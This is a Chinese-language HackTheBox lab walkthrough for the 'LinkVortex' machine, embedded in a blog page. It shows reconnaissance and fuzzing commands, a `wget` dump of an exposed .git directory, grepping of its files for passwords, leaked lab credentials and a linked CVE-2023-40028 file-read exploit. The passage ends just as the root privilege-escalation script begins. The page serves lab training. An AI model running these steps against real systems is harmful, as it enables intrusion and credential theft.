@@ -1,0 +1,395 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0638-linkvortex/"><!-- Primary Meta Tags --><title>LinkVortex · Zumpyx Blog</title><meta name="description" content="LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed `.git` directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0638-linkvortex/"><meta property="og:title" content="LinkVortex · Zumpyx Blog"><meta property="og:description" content="LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed `.git` directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0638-linkvortex/"><meta name="twitter:title" content="LinkVortex · Zumpyx Blog"><meta name="twitter:description" content="LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed `.git` directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-12-07T00:00:00.000Z">2024-12-07</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.BQ3GNJri_Z1rtx4U.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>LinkVortex</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#638</span><span class="badge difficulty-easy" data-astro-cid-twh6cqtg>Easy</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><blockquote>
+<p><strong>Tags:</strong> ghost**、<strong>git_leak</strong>、<strong>CVE-2023-40028</strong>、**Symbolic_link</p>
+</blockquote>
+<h2 id="recon--enum">Recon &amp; Enum</h2>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT      STATE    SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)</span></span>
+<span class="line"><span>|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)</span></span>
+<span class="line"><span>80/tcp    open     http    Apache httpd</span></span>
+<span class="line"><span>|_http-title: Did not follow redirect to http://linkvortex.htb/</span></span>
+<span class="line"><span>|_http-server-header: Apache</span></span>
+<span class="line"><span>17037/tcp filtered unknown</span></span>
+<span class="line"><span>23632/tcp filtered unknown</span></span>
+<span class="line"><span>28739/tcp filtered unknown</span></span>
+<span class="line"><span>52317/tcp filtered unknown</span></span>
+<span class="line"><span>59144/tcp filtered unknown</span></span>
+<span class="line"><span>59368/tcp filtered unknown</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>ffuf -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fs 230</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116...]</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>feroxbuster -u http://linkvortex.htb/ -d 1</span></span>
+<span class="line"><span>feroxbuster -u http://dev.linkvortex.htb/ -d 1</span></span></code></pre>
+<h2 id="shell-as-user">Shell as User</h2>
+<p>linkvortex.htb 页面是一个基于 ghost 的内容管理系统</p>
+<p><img alt="image-20241208144838785.png" loading="lazy" decoding="async" width="1356" height="321" src="/_astro/image-20241208144838785.DXnyfx8Y_Z1Xb4Nu.webp" srcset=""></p>
+<p><img alt="image-20241208144903080.png" loading="lazy" decoding="async" width="1527" height="1260" src="/_astro/image-20241208144903080.Car1Phnu_2o4vao.webp" srcset=""></p>
+<p>可以访问默认的后台登录路径，这里先对前面的博客文章进行爬取</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">cewl</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -w</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> res/web.dict</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> http://linkvortex.htb/</span></span></code></pre>
+<p>dev.linkvortex.htb 是一个建设中的网站</p>
+<p><img alt="image-20241208144721110.png" loading="lazy" decoding="async" width="1600" height="1069" src="/_astro/image-20241208144721110.B2h-K0qQ_2phnH1.webp" srcset=""></p>
+<p>目录扫描发现 .git 目录</p>
+<p><img alt="image-20241208145647745.png" loading="lazy" decoding="async" width="1104" height="1063" src="/_astro/image-20241208145647745.3kdR5wEA_ZpI6hl.webp" srcset=""></p>
+<p>可以使用 wget 全部下载下来，然后可以使用 git 恢复这些文件</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">wget</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> http://dev.linkvortex.htb/.git/</span></span></code></pre>
+<p>删除多余文件，把 git 恢复一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">rm</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -rf</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> icons</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> index.html</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">git</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> restore</span><span style="--shiki-light:#005CC5;--shiki-dark:#ACAFFF"> *</span></span></code></pre>
+<p><img alt="image-20241208191909918.png" loading="lazy" decoding="async" width="1401" height="619" src="/_astro/image-20241208191909918.BXaWGZzg_Z1dk73J.webp" srcset=""></p>
+<p>从文件名来看很像有凭据，检查一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ghost/core/test/regression/api/admin/authentication.test.js</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> password</span></span></code></pre>
+<p><img alt="image-20241208192200273.png" loading="lazy" decoding="async" width="1378" height="1123" src="/_astro/image-20241208192200273.CoI3mOgd_ZuQ5oO.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>OctopiFociPilfer45</span></span>
+<span class="line"><span>thisissupersafe</span></span>
+<span class="line"><span>lel123456</span></span>
+<span class="line"><span>12345678910</span></span>
+<span class="line"><span>invalid_password</span></span></code></pre>
+<p>因为前面发现的登录窗口还需要用户名，也是邮箱，因此再看一下</p>
+<p><img alt="image-20241208192346803.png" loading="lazy" decoding="async" width="1621" height="1168" src="/_astro/image-20241208192346803.Gk2h6qyH_Z1WyPOo.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>test@example.com</span></span>
+<span class="line"><span>test-leo@example.com</span></span>
+<span class="line"><span>test-edit@example.com</span></span>
+<span class="line"><span>notinvited@example.org</span></span></code></pre>
+<p>然后爆破试一下，发现都不行，考虑到这些邮箱都是 <code>example</code>，所以给他换一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>admin@example.com</span></span>
+<span class="line"><span>admin@example.org</span></span>
+<span class="line"><span>test@linkvortex.htb</span></span>
+<span class="line"><span>test-leo@linkvortex.htb</span></span>
+<span class="line"><span>test-edit@linkvortex.htb</span></span>
+<span class="line"><span>notinvited@linkvortex.htb</span></span>
+<span class="line"><span>admin@linkvortex.htb</span></span></code></pre>
+<p>基本把能想到的都枚举一下，再次尝试</p>
+<p><img alt="image-20241208192828205.png" loading="lazy" decoding="async" width="1387" height="882" src="/_astro/image-20241208192828205.B9GCyKWS_Xaftx.webp" srcset=""></p>
+<p><code>admin@linkvortex.htb / OctopiFociPilfer45</code> 登录成功，这里使用 <code>git log</code> 也能看到版本。</p>
+<p><img alt="image-20241208192911943.png" loading="lazy" decoding="async" width="1455" height="775" src="/_astro/image-20241208192911943.DmKV7Ddb_Z1u4blJ.webp" srcset=""></p>
+<p>搜一下漏洞</p>
+<p><img alt="image-20241208193254880.png" loading="lazy" decoding="async" width="2328" height="789" src="/_astro/image-20241208193254880.b6D78nQs_2doDGX.webp" srcset=""></p>
+<p>这里的 <a href="https://www.cve.org/CVERecord?id=CVE-2023-40028">CVE-2023-40028</a> 符合版本信息，而且是一个任意文件读取漏洞，尝试利用一下</p>
+<blockquote>
+<p><a href="https://github.com/0xyassine/CVE-2023-40028">https://github.com/0xyassine/CVE-2023-40028</a></p>
+</blockquote>
+<p><img alt="image-20241208193724498.png" loading="lazy" decoding="async" width="1348" height="1156" src="/_astro/image-20241208193724498.8bg82rzw_1yhX4o.webp" srcset=""></p>
+<p>可以读取文件，但是读不到 root 的私钥，结合 dev 得到的仓库信息，应该是个 docker 环境。</p>
+<p>看一下这个 web 服务有没有什么敏感文件</p>
+<p><img alt="image-20241208193834865.png" loading="lazy" decoding="async" width="1351" height="771" src="/_astro/image-20241208193834865.DOONuJ9U_V7Vi5.webp" srcset=""></p>
+<p>这里的 Dockerfile 会复制一个配置文件和两个 shell 脚本，先看看配置文件内容，这里也给了路径。</p>
+<p><img alt="image-20241208193948424.png" loading="lazy" decoding="async" width="1336" height="693" src="/_astro/image-20241208193948424.C8Yrvnqu_1yhszj.webp" srcset=""></p>
+<p>里面有 bob 用户的 mail 凭据 <code>bob@linkvortex.htb / fibber-talented-worth</code>，尝试登录 ssh</p>
+<p><img alt="image-20241208194052357.png" loading="lazy" decoding="async" width="1180" height="633" src="/_astro/image-20241208194052357.XWcFnpOs_7bM77.webp" srcset=""></p>
+<h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241208194108034.png" loading="lazy" decoding="async" width="1192" height="198" src="/_astro/image-20241208194108034.BSkXUBgQ_1U4kdV.webp" srcset=""></p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">QUAR_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"/var/quarantined"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># 检查 CHECK_CONTENT 初始化</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [ </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-z</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $CHECK_CONTENT</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ];</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">  CHECK_CONTENT</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">false</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">fi</span></span>
+<span class="line"></span>
